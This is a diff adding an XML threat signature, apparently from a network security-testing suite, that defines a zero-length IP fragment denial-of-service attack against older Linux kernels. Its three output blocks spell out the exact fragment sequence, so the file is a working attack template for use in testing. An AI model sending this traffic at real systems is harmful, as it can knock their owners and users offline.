@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <SoftwareRevision display="true" value="1.4"/>
+    <ExecDesc display="true" value="Zero Length Fragment Attack"/>
+    <EngDesc display="true" value="This threat sends three fragments comprising one IP packet. The second fragment falls inside the boundaries set by the first, and is of zero length. The third fragment represents the ending portion of the packet. This attack can result in older Linux kernels to lose their network connectivity by using up all available routing cache memory."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Fragmentation"/>
+    </Intent>
+    <Protocol display="true" value="IP"/>
+    <Type_Of_Equipment display="true" value="Protocol"/>
+    <Known_Vendors_Affected display="true">
+      <item value="D-Link"/>
+      <item value="Linux"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Linux_Kernel"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.securityfocus.com/archive/1/316584"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value="7221"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464dccc200a900fe009b00c95b999599"/>
+    <Revision display="true" value="6"/>
+    <Safe display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <Suite display="true" value="Standard"/>
+    <AccessVector value="remote"/>
+    <AccessComplexity value="low"/>
+    <Authentication value="not-required"/>
+    <ConfImpact value="none"/>
+    <IntegImpact value="none"/>
+    <AvailImpact value="partial"/>
+    <ImpactBias value="normal"/>
+    <Created value="1139461737" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+    <for index="F"/>
+    <for index="G"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="" TotalLength="20" Identification="5" FragmentOffset="0" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="AAAAAAAAAAAA" CE="false" DF="false" MF="true"/>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="" TotalLength="14" Identification="5" FragmentOffset="0" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="" CE="false" DF="false" MF="true"/>
+    </Ethernet>
+  </Output>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="" TotalLength="20" Identification="5" FragmentOffset="1" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="AAAAAAAAAAAA" CE="false" DF="false" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
